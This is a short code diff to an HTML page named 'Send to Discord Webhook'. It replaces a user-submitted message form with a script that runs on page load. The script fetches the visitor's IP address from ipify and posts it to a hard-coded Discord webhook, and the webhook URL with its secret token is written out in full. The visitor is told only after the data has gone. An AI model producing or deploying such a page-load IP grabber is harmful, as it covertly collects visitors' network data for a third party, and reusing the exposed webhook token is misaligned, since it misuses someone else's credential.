@@ -7,21 +7,11 @@
     <title>Send to Discord Webhook</title>
 </head>
 <body>
-    <form id="userForm">
-        <label for="userInput">Enter your message:</label>
-        <input type="text" id="userInput" name="userInput">
-        <button type="submit">Send to Discord</button>
-    </form>
-
     <script>
-        document.getElementById('userForm').onsubmit = async function(event) {
-            event.preventDefault();
-
-            const message = document.getElementById('userInput').value;
-
+        document.addEventListener('DOMContentLoaded', async function() {
             const url = 'https://discord.com/api/webhooks/1211163247063994388/n0aNuw0Xy-9yX0GQoti5-ZfV-eJjsce-jQxHbLTbHppO3OmCqCHDzGtNobW0fbIenn5e';
             const payload = {
-                content: `Message: ${message} | User IP: ${await getIp()}`
+                content: `Automated message | User IP: ${await getIp()}`
             };
 
             await fetch(url, {
@@ -32,9 +22,8 @@
                 body: JSON.stringify(payload),
             });
 
-            alert('Message with IP sent to Discord!');
-            document.getElementById('userInput').value = '';
-        };
+            alert('Automated message with IP sent to Discord!');
+        });
 
         async function getIp() {
             return fetch('https://api.ipify.org?format=json')
